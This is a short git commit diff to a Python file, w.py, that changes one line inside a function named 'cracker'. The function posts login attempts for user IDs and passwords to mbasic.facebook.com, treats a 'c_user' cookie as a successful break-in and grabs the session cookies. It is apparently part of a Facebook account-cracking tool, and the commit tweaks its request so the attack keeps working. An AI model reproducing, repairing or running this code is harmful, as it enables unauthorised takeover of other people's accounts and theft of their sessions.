a99053c0777bae4621ed68d2b905c19c9ce6cbc7
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-07-04 20:59:52 +0530

    Update w.py

--- w.py
+++ w.py
@@ -2154,7 +2154,7 @@ def cracker(uid, pwx, tl):
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
